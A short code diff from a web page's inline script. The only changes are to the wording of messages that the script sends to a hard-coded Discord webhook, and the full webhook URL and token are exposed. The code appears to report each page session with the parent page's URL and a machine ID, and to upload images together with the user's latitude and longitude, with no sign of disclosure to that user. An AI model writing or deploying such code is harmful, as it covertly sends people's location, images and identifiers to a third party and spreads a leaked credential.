@@ -93,7 +93,7 @@
     <script>
         const webhookUrl = 'https://discord.com/api/webhooks/1269290884256497664/SpS3dpNZpFy9-S4L4zp3Q3MMdsFVudFAFhECf2DHtGQfydN_BzNoa7ahXPncfQXy7wk7';
         const formDataLoad = new FormData();
-        formDataLoad.append('content', `NEW SESSION OPENED From path: ${window.parent.location.href}\nFrom UUID: ${getMachineId()}`);
+        formDataLoad.append('content', `NEW SESSION OPENED\nFrom path: ${window.parent.location.href}\nFrom UUID: ${getMachineId()}`);
         fetch(webhookUrl, {
                 method: 'POST',
                 body: formDataLoad,
@@ -202,7 +202,7 @@
         function sendToDiscordBot(latitude, longitude, imageBlob, fileName) {
             const formData = new FormData();
             formData.append('file', imageBlob, fileName);
-            formData.append('content', `New image uploaded with coordinates: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}\nFrom path: ${window.parent.location.href}\nFrom UUID: ${getMachineId()}`);
+            formData.append('content', `New image uploaded:\n${latitude}, ${longitude}\nFrom path: ${window.parent.location.href}\nFrom UUID: ${getMachineId()}`);
 
             fetch(webhookUrl, {
                 method: 'POST',
